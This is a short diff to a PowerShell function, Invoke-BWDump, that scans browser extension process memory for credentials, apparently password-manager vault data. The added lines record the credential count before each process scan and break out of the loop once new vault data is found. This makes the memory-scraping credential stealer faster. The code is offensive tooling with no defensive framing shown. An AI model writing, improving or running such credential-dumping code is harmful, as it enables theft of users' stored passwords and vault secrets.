@@ -896,7 +896,12 @@ function Invoke-BWDump {
                 Write-Status "$browser ($($procs.Count) procs, scanning top 3)" "info"
             }
             foreach ($t in $targets) {
+                $before = $credentials.Count
                 Scan-ProcessMemory -Target $t -Credentials ([ref]$credentials) -DoSaveDump $false -Label "$browser ext"
+                if ($credentials.Count -gt $before) {
+                    Write-Status "  Vault data found, skipping remaining $browser extension processes" "good"
+                    break
+                }
             }
         }
         if (-not $browsersFound) {
